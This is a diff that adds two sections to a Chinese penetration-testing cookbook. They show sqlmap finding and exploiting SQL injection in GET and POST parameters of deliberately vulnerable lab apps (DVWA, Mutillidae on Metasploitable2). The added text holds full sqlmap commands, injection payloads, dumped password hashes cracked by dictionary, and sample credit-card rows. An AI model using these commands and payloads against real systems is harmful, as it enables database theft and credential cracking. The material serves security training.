@@ -568,3 +568,205 @@ Burp 会自动使用响应中的所有 Cookie 值填充 Cookie 下拉菜单。�
 ### 工作原理
 
 BurpSuite Sequencer 对伪随机数样本执行大量不同的数学评估，根据所生成随机数的熵尝试判断其质量。实时捕获可用于生成样本值，它通过提交事先构造的请求，并导致服务器指派新的值。这通常通过从请求中移除现有`Cookie`值，从而使响应以新的`Set-Cookie`协议头的形式，提供新的会话标识来完成。
+
+## 7.14 使用 sqlmap 注入 GET 方法
+
+Web 应用常常接受所提供 URL 内的参数。这些参数通常以 HTTP GET 方法传给服务器。如果任何这些参数随后包含在发给后端数据库的查询语句中，SQL 注入漏洞就可能存在。我们会讨论如何使用 sqlmap 来自动化 HTTP GET 方法请求参数的测试。
+
+### 准备
+
+为了使用 sqlmap 对目标执行 Web 应用分析，你需要拥有运行一个或多个 Web 应用的远程系统。所提供的例子中，我们使用 Metasploitable2 实例来完成任务。 Metasploitable2 拥有多种预安装的漏洞 Web 应用，运行在 TCP 80 端口上。配置 Metasploitable2 的更多信息请参考第一章中的“安装 Metasploitable2”秘籍。
+
+### 操作步骤
+
+为了使用 sqlmap 来测试 HTTP GET 方法参数，你需要使用`-u`参数以及要测试的 URL。这个 URL 应该包含任何 GET 方法参数。此外，如果 Web 内容仅仅通过建立的会话来方法，还需要使用`--cookie`提供与会话对应的 Cookie。
+
+```
+root@KaliLinux:~# sqlmap -u "http://172.16.36.135/dvwa/vulnerabilities/ sqli/?id=x&Submit=y" --cookie="security=low; PHPSESSID=bcd9bf2b6171b16f94 3cd20c1651bf8f" --risk=3 --level=5 
+                                ** {CUT} ** 
+sqlmap identified the following injection points with a total of 279 HTTP(s) requests: 
+--
+Place: GET 
+Parameter: id
+    Type: boolean-based blind    
+    Title: OR boolean-based blind - WHERE or HAVING clause    
+    Payload: id=-2345' OR (1644=1644) AND 'moHu'='moHu&Submit=y
+    
+    Type: error-based    
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    
+    Payload: id=x' AND (SELECT 1537 FROM(SELECT COUNT(*),CONCAT(0x3a6b6f 683a,(SELECT (CASE WHEN (1537=1537) THEN 1 ELSE 0 END)),0x3a696a793a,FLO OR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'VHVT'='VHVT&Submit=y
+    
+    Type: UNION query    
+    Title: MySQL UNION query (NULL) - 2 columns    
+    Payload: id=x' UNION ALL SELECT CONCAT(0x3a6b6f683a,0x7979634f4e716b7 55961,0x3a696a793a),NULL#&Submit=y
+    
+    Type: AND/OR time-based blind    
+    Title: MySQL < 5.0.12 AND time-based blind (heavy query)    
+    Payload: id=x' AND 5276=BENCHMARK(5000000,MD5(0x704b5772)) AND 'XiQP'='XiQP&Submit=y 
+--
+
+                            ** {TRUNCATED} ** 
+```
+
+上面的例子使用了`risk`值`3`和`level`值`5`。这些值定义了所执行测试的风险性和彻底性。更多`risk`和`level`的信息请参考 sqlmap 手册页和帮助文件。执行测试时，sqlmap 会快速将后端数据库识别为 MySQL，并跳过其它测试。如果没有指定任何操作，sqlmap 会仅仅判断是否任何参数存在漏洞，像上个例子那样。在一系列注入尝试之后，sqlmap 判断出`ID`参数存在多种类型的 SQL 注入漏洞。在确认漏洞之后，sqlmap 会执行操作来提取后端数据库的信息。
+
+```
+root@KaliLinux:~# sqlmap -u "http://172.16.36.135/dvwa/vulnerabilities/ sqli/?id=x&Submit=y" --cookie="security=low; PHPSESSID=bcd9bf2b6171b16f94 3cd20c1651bf8f" --risk=3 --level=5 --dbs 
+                            ** {CUT} ** 
+
+--
+[03:38:00] [INFO] the back-end DBMS is MySQL 
+web server operating system: Linux Ubuntu 8.04 (Hardy Heron) 
+web application technology: PHP 5.2.4, Apache 2.2.8 
+back-end DBMS: MySQL 5.0 
+[03:38:00] [INFO] fetching database names 
+[03:38:00] [WARNING] reflective value(s) found and filtering out 
+available databases [7]: 
+[*] dvwa
+[*] information_schema 
+[*] metasploit 
+[*] mysql 
+[*] owasp10 
+[*] tikiwiki 
+[*] tikiwiki195
+                            ** {TRUNCATED} ** 
+```
+
+在上面的例子中，`--dbs`参数用于枚举所有可用的，能通过 SQL 注入访问的数据库。通过名称来判断，它表明列出的数据库直接对应 DVWA 的应用。我们之后可以直接对数据库执行操作。为了提取 DWVA 数据库的所有表的名称，我们可以使用`--tables`参数来让 sqlmap 提取表名称，之后使用`-D`参数指定需要提取的数据库（`dvwa`）。
+
+```
+root@KaliLinux:~# sqlmap -u "http://172.16.36.135/dvwa/vulnerabilities/ sqli/?id=x&Submit=y" --cookie="security=low; PHPSESSID=bcd9bf2b6171b16f94 3cd20c1651bf8f" --risk=3 --level=5 --tables -D dvwa 
+                            ** {CUT} ** 
+Database: dvwa 
+[2 tables] 
++-----------+ 
+| guestbook | 
+| users     | 
++-----------+ 
+                            ** {TRUNCATED} ** 
+```
+
+这样做，我们可以看到 DVWA 数据库中有两个表。这些表包括`guestbook`和`users`。用户表通常值得提取，因为它通常包含用户名和相关的密码哈希。为了从某个指定表中提取信息，我们可以使用`--dump`参数，之后使用`-D`参数来指定数据库，`-T`参数来指定提取哪个表的内容。
+
+```
+root@KaliLinux:~# sqlmap -u "http://172.16.36.135/dvwa/vulnerabilities/ sqli/?id=x&Submit=y" --cookie="security=low; PHPSESSID=bcd9bf2b6171b16f94 3cd20c1651bf8f" --risk=3 --level=5 --dump -D dvwa -T users 
+                            ** {CUT} ** 
+do you want to crack them via a dictionary-based attack? [Y/n/q] Y 
+[03:44:03] [INFO] using hash method 'md5_generic_passwd' 
+what dictionary do you want to use?
+[1] default dictionary file './txt/wordlist.zip' (press Enter) 
+[2] custom dictionary file 
+[3] file with list of dictionary files 
+> 
+[03:44:08] [INFO] using default dictionary 
+do you want to use common password suffixes? (slow!) [y/N] N 
+                                ** {CUT} ** 
+Database: dvwa 
+Table: users 
+[5 entries] 
++---------+---------+-------------------------------------------------------+---------------------------------------------+-----------+-----------+ 
+| user_id | user    | avatar                                                 | password                                    | last_name | first_name | 
++---------+---------+-------------------------------------------------------+---------------------------------------------+-----------+-----------+ 
+| 1       | admin   | http://192.168.223.132/dvwa/hackable/users/admin. jpg   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin     | admin      | 
+| 2       | gordonb | http://192.168.223.132/dvwa/hackable/users/gordonb. jpg | e99a18c428cb38d5f260853678922e03 (abc123)   | Brown     | Gordon     | 
+| 3       | 1337    | http://192.168.223.132/dvwa/hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  | Me        | Hack       | 
+| 4       | pablo   | http://192.168.223.132/dvwa/hackable/users/pablo. jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  | Picasso   | Pablo      | 
+| 5       | smithy  | http://192.168.223.132/dvwa/hackable/users/smithy. jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith     | Bob        | 
++---------+---------+-------------------------------------------------------+---------------------------------------------+-----------+-----------+ 
+                                ** {TRUNCATED} **
+```
+
+在识别表的内容中存在密码哈希之后，sqlmap 会提供选项，询问用户是否使用内置的密码破解器来对枚举密码哈希执行字典攻击。这可以使用内置单词列表，自定义单词列表，或者一系列单词列表来执行。在执行字典攻击之后，我们可以看到表的内容包含用户 ID，用户头像的位置，MD5 哈希，哈希的纯文本附加值（盐），以及用户姓名。
+
+### 工作原理
+
+sqlmap 的原理是提交来自大量已知 SQL 注入查询列表的请求。它在近几年间已经高度优化，并给予之前查询的响应来智能调整注入。在 HTTP GET 参数上执行 SQL 注入非常繁琐，因为修改内容要经过请求 URL 。
+
+## 7.15 使用 sqlmap 注入 POST 方法
+
+sqlmap 是 Kali 中的集成命令行工具，它通过自动化整个流程，极大降低了手动利用 SQL 注入漏洞所需的经历总量。这个秘籍中，我们会讨论如何使用 sqlmap 来自动化 HTTP POST 请求参数的测试。
+
+### 准备
+
+为了使用 sqlmap 对目标执行 Web 应用分析，你需要拥有运行一个或多个 Web 应用的远程系统。所提供的例子中，我们使用 Metasploitable2 实例来完成任务。 Metasploitable2 拥有多种预安装的漏洞 Web 应用，运行在 TCP 80 端口上。配置 Metasploitable2 的更多信息请参考第一章中的“安装 Metasploitable2”秘籍。
+
+为了在使用 HTTP POST 方法的服务上指定 SQL 注入，我们需要使用`--data`参数来指定 POST 参数字符串。Mutillidae 的登录应用提供了一个登录页面，它通过 POST 方法传递用户名和密码。它就是我们的 SQL 注入攻击目标。看看下面的例子：
+
+```
+root@KaliLinux:~# sqlmap -u "http://172.16.36.135/mutillidae/index. php?page=login.php" --data="username=user&password=pass&login-php-submitbutton=Login" --level=5 --risk=3 
+                        ** {CUT} ** 
+sqlmap identified the following injection points with a total of 267 HTTP(s) requests:
+--
+Place: POST 
+Parameter: username    
+    Type: boolean-based blind    
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)    
+    Payload: username=-8082' OR (4556=4556)#&password=pass&login-phpsubmit-button=Login
+    
+    Type: error-based    
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    
+    Payload: username=user' AND (SELECT 3261 FROM(SELECT COUNT(*),CONCAT( 0x3a61746d3a,(SELECT (CASE WHEN (3261=3261) THEN 1 ELSE 0 END)),0x3a76676 23a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x) a) AND 'MraR'='MraR&password=pass&login-php-submit-button=Login 
+--
+[04:14:10] [INFO] the back-end DBMS is MySQL 
+web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
+web application technology: PHP 5.2.4, Apache 2.2.8 
+back-end DBMS: MySQL 5.0 
+                        ** {TRUNCATED} ** 
+```
+
+如果没有指定操作，sqlmap 仅仅会判断是否任何参数存在漏洞，像上面的例子那样。在一系列注入尝试之后，sqlmap 判断出用户名 POST 参数存在`boolean-blind`和`error-based`漏洞。在确认漏洞之后，sqlmap 会执行操作，开始从后端数据库提取信息。
+
+```
+root@KaliLinux:~# sqlmap -u "http://172.16.36.135/mutillidae/index. php?page=login.php" --data="username=user&password=pass&login-php-submitbutton=Login" --dbs 
+                        ** {CUT} ** 
+available databases [7]: 
+[*] dvwa 
+[*] information_schema 
+[*] metasploit 
+[*] mysql 
+[*] owasp10 
+[*] tikiwiki 
+[*] tikiwiki195 
+                        ** {TRUNCATED} **
+```
+
+在上面的例子中，`--dbs`参数用于枚举所有可用的，可通过 SQL 注入访问的数据库。我们随后可以对特定数据库直接执行操作。为了提取`owasp10`数据库中的所有表的名称，我们可以使用`--tables`参数让 sqlmap 提取表名称。之后使用`-D`参数来指定从哪个数据库（`owasp10`）提取名称。
+
+```
+root@KaliLinux:~# sqlmap -u "http://172.16.36.135/mutillidae/index. php?page=login.php" --data="username=user&password=pass&login-php-submitbutton=Login" --tables -D owasp10 
+                    ** {CUT} ** 
+Database: owasp10 
+[6 tables] 
++----------------+ 
+| accounts       | 
+| blogs_table    | 
+| captured_data  | 
+| credit_cards   | 
+| hitlog         | 
+| pen_test_tools | 
++----------------+ 
+                    ** {TRUNCATED} ** 
+```
+
+这样做，我们就可以看到，`owasp10`数据库中存在六个表。这些表包含`accounts, blog_table, captured_data, credit_cards, hitlog, and pen_test_tools`。最明显的表名称是`credit_cards`。为了提取某个指定表的内容，我们可以使用`--dump`参数，之后使用`-D`参数来指定数据库，`-T`参数来指定从哪个表中提取内容。
+
+```
+root@KaliLinux:~# sqlmap -u "http://172.16.36.135/mutillidae/index. php?page=login.php" --data="username=user&password=pass&login-php-submitbutton=Login" --dump -D owasp10 -T credit_cards 
+                    ** {CUT} ** 
+Database: owasp10 
+Table: credit_cards 
+[5 entries] 
++------+-----+------------------+------------+ 
+| ccid | ccv | ccnumber         | expiration | +------+-----+------------------+------------+ 
+| 1    | 745 | 4444111122223333 | 2012-03-01 |
+| 2    | 722 | 7746536337776330 | 2015-04-01 | 
+| 3    | 461 | 8242325748474749 | 2016-03-01 | 
+| 4    | 230 | 7725653200487633 | 2017-06-01 | 
+| 5    | 627 | 1234567812345678 | 2018-11-01 | +------+-----+------------------+------------+ 
+                    ** {TRUNCATED} **
+```
+
+### 工作原理
+
+sqlmap 的原理是提交来自大量已知 SQL 注入查询列表的请求。它在近几年间已经高度优化，并给予之前查询的响应来智能调整注入。在 HTTP POST 参数上执行 SQL 注入的原理是操作添加到 POST 方法请求末尾的数据。
